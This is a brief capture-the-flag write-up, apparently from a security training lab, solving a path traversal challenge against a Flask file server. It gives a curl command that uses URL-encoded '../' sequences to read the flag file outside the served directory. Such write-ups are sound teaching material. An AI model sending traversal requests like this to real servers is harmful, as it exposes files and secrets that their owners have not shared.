# Path Traversal 1

```shell
cat /challenge/server
```

The server is a Flask app that, on receiving requests at `/package/<path>`, serves the file at `/challenge/files/path`
We know that the flag is at `/flag`

Start the server and use curl:

```shell
curl -v http://challenge.localhost:80/package/..%2F..%2Fflag
```

"..%2F" is URL-encoding of "../"
